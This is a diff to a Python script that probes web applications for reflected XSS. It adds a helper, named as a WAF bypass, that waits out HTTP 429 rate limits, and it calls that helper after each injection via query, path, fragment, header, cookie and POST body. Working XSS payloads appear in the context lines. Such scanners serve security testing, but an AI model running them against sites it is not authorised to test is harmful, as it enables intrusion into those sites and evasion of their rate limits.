@@ -3,6 +3,7 @@ from bs4 import BeautifulSoup
 import urllib.parse
 import urllib3
 import base64
+import time
 import sys
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -32,6 +33,17 @@ xss_payloads = [
     "<video><source onerror=fetch('/evil')>",
     "<style>@import'javascript:fetch(\"/evil\")';</style>"
 ]
+
+# ============================================
+#        HELPER FUNCTIONS
+# ============================================
+
+def waf_bypass_timer(status_code):
+    """ Wait if rate limited """
+    if(status_code == 429):
+        print("Rate limited. Waiting sixty seconds...")
+        time.sleep(60)
+    return 0
 
 # ============================================
 #        TRANSFORMATION FUNCTIONS
@@ -216,7 +228,7 @@ def test_xss(session, url, param_name="testparam"):
       - Cookies
       - POST body
     """
-    print(f"\n[+] Testing Reflected XSS on: {url} with param '{param_name}'")
+    print(f"\n[+] Testing Reflected XSS")
 
     successful_payloads = []
 
@@ -231,6 +243,7 @@ def test_xss(session, url, param_name="testparam"):
             test_url = f"{url}?{urllib.parse.urlencode(params)}"
             print(f"[~] Testing Query Parameter Injection: {test_url}")
             response = session.get(test_url, verify=False)
+            block_timeout = waf_bypass_timer(response.status_code)
             if obfuscated_payload in response.text:
                 print(f"[+] Payload reflected via QUERY: {test_url}")
                 successful_payloads.append(("QUERY", test_url))
@@ -240,6 +253,7 @@ def test_xss(session, url, param_name="testparam"):
             test_url = f"{url.rstrip('/')}/{path_payload}"
             print(f"[~] Testing Path Injection: {test_url}")
             response = session.get(test_url, verify=False)
+            waf_bypass_timer(response.status_code)
             if obfuscated_payload in response.text:
                 print(f"[+] Payload reflected via PATH: {test_url}")
                 successful_payloads.append(("PATH", test_url))
@@ -249,6 +263,7 @@ def test_xss(session, url, param_name="testparam"):
             test_url = f"{url}#{fragment_payload}"
             print(f"[~] Testing Fragment Injection: {test_url}")
             response = session.get(test_url, verify=False)
+            waf_bypass_timer(response.status_code)
             if obfuscated_payload in response.text:
                 print(f"[+] Payload reflected via FRAGMENT: {test_url}")
                 successful_payloads.append(("FRAGMENT", test_url))
@@ -261,16 +276,16 @@ def test_xss(session, url, param_name="testparam"):
             }
             print(f"[~] Testing Header Injection with headers: {headers}")
             response = session.get(url, headers=headers, verify=False)
+            waf_bypass_timer(response.status_code)
             if obfuscated_payload in response.text:
                 print(f"[+] Payload reflected via HEADERS: {headers}")
                 successful_payloads.append(("HEADERS", headers))
 
             # --- Cookie Injection ---
-            # Note: Some domains won't accept cookies if the domain doesn't match.
-            # You might need to adjust for your specific target domain.
             print(f"[~] Testing Cookie Injection: XSS-Test={obfuscated_payload}")
             session.cookies.set("XSS-Test", obfuscated_payload)
             response = session.get(url, verify=False)
+            waf_bypass_timer(response.status_code)
             if obfuscated_payload in response.text:
                 print(f"[+] Payload reflected via COOKIE: {obfuscated_payload}")
                 successful_payloads.append(("COOKIE", obfuscated_payload))
@@ -279,6 +294,7 @@ def test_xss(session, url, param_name="testparam"):
             post_data = {param_name: obfuscated_payload}
             print(f"[~] Testing POST Body Injection: {post_data}")
             response = session.post(url, data=post_data, verify=False)
+            waf_bypass_timer(response.status_code)
             if obfuscated_payload in response.text:
                 print(f"[+] Payload reflected via POST: {post_data}")
                 successful_payloads.append(("POST", post_data))
